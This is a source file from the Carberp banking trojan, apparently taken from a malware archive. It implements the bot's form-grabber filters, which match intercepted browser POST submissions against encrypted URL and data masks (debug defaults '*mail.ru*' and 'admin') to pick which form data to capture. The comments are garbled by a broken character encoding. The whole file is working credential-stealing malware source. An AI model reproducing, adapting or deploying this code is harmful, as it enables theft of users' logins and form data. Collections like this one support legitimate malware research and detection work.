/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------


#pragma hdrstop

#include "Modules.h"
#ifdef FgrFiltersH


//---------------------------------------------------------------------------
#include "Memory.h"
#include "Strings.h"
#include "Crypt.h"

//---------------------------------------------------------------------------



#include "BotDebug.h"

namespace FGRFLTDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define FGRFLTDBG FGRFLTDEBUGSTRINGS::DBGOutMessage<>


//****************************************************
//  ������ URL ������� � ������� ��� ����� ����������
//  ������ HTML ����.
//****************************************************
#ifndef DEBUGCONFIG
	char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = FGRFILTER_PARAM_NAME_URLS;
#else
	char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = "*mail.ru*\0";
#endif
#define FGR_URL_FILTERS_HASH 0xBB05876C /* FGR_URL_FILTERS */


//****************************************************
//  ������ ����� ��������������� ���� ������
//****************************************************
#ifndef DEBUGCONFIG
	char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = FGRFILTER_PARAM_NAME_DATAMASK;
#else
	char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = "admin\0";
#endif

#define FGR_PARAMS_FILTERS_HASH 0xBE738607 /* FGR_PARAMS_FILTERS */


//---------------------------------------------------------------------


//-------------------------------------------------
//  FiltrateFormGrabberURL - ������� ����������
//  	������ ���� ������ ��������������
//		������������
//-------------------------------------------------
bool FiltrateFormGrabberURL(const char* URL)
{
	//  ������� ���������� ������ ���� ������
	//	��������������	������������

	if (AnsiStr::IsEmpty(URL))
		return false;

	TStrEnum E(FGR_URL_FILTERS, FGRFILTER_PARAM_ENCRYPTED_URLS, FGR_URL_FILTERS_HASH);

	if (E.IsEmpty())
		return true;

	while (E.Next())
	{
		if (WildCmp((char*)URL, E.Line().t_str()))
			return true;
	}

    return false;
}
//---------------------------------------------------------------------


//-------------------------------------------------
//  FiltrateFormGrabberData - ������� ����������
//  	������ ���� ������ ������ ����������
//-------------------------------------------------
bool FiltrateFormGrabberData(const char* Data)
{
	if (AnsiStr::IsEmpty(Data))
		return false;

	TStrEnum E(FGR_PARAMS_FILTERS, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGR_PARAMS_FILTERS_HASH);

	if (E.IsEmpty())
		return true;

	while (E.Next())
	{
		if (WildCmp((char*)Data, E.Line().t_str()))
			return true;
	}
		
    return false;
}



//-------------------------------------------------
//  ������� ��������� ���� ������ � � ������
//  ������������� �������� �� �� ������ ����������
//  ������
//-------------------------------------------------
bool FiltratePostData(const char* URL, const char* Data)
{
	bool Result = FiltrateFormGrabberURL(URL) ||
				  FiltrateFormGrabberData(Data);
	if (Result)
	{
		FGRFLTDBG("FormGrabber_Filters", "������������� �� ���� ������. URL %s", URL);
	}
	return Result;
}



//---------------------------------------------------------------------------
#endif
